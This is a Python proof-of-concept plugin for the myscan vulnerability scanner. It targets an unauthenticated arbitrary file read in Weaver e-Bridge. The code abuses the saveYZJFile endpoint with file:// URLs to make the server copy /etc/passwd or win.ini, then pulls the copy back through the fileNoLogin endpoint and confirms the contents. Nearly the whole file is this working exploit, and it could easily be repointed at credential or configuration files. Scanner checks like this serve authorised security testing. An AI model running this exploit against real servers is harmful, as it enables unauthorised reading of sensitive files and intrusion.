# !/usr/bin/env python3
# @Time    : 2020/9/18
# @Author  : caicai
# @File    : poc_weaver-ebridge-file-read_2020.py
'''
"泛微云桥e-Bridge"
'''

from myscan.lib.parse.response_parser import response_parser  ##写了一些操作resonse的方法的类
from myscan.lib.helper.request import request  # 修改了requests.request请求的库，建议使用此库，会在redis计数
from myscan.config import scan_set
import re


class POC():
    def __init__(self, workdata):
        self.dictdata = workdata.get("dictdata")  # python的dict数据，详情请看docs/开发指南Example dict数据示例
        self.url = workdata.get("data")  # self.url为需要测试的url，值为目录url，会以/结尾,如https://www.baidu.com/home/ ,为目录
        self.result = []  # 此result保存dict数据，dict需包含name,url,level,detail字段，detail字段值必须为dict。如下self.result.append代码
        self.name = "weaver-ebridge-file-read"
        self.vulmsg = "links https://mrxn.net/Infiltration/323.html"
        self.level = 2  # 0:Low  1:Medium 2:High

    def verify(self):
        # 根据config.py 配置的深度，限定一下目录深度
        if self.url.count("/") > int(scan_set.get("max_dir", 2)) + 2:
            return
        for file_, search in {"file:///c://windows/win.ini": [b"for 16-bit app support", b"[extensions]"],
                              "file:///etc/passwd": [b"root:[x*]:0:0:"]}.items():
            req = {
                "method": "GET",
                "url": self.url + "wxjsapi/saveYZJFile?fileName=test&downloadUrl={}&fileExt=txt".format(file_),
                "headers": self.dictdata.get("request").get("headers"),  # 主要保留cookie等headers
                "timeout": 10,
                "verify": False,
                "allow_redirects": False

            }
            r = request(**req)
            if r != None and r.status_code == 200 and "json" in r.headers.get("Content-Type",
                                                                              "") and b"id" in r.content:
                res = re.search("\"id\"\:\"(?P<var>.+?)\"\,", r.text)
                if res:
                    var = res.groupdict().get('var')
                    req["url"] = self.url + "file/fileNoLogin/{}".format(var)
                    r1 = request(**req)
                    if r1 is not None and r1.status_code == 200 and all([re.search(x, r1.content) for x in search]):
                        parser_ = response_parser(r1)
                        self.result.append({
                            "name": self.name,
                            "url": parser_.geturl(),
                            "level": self.level,  # 0:Low  1:Medium 2:High
                            "detail": {
                                "vulmsg": self.vulmsg,
                                "request": parser_.getrequestraw(),
                                "response": parser_.getresponseraw()
                            }
                        })
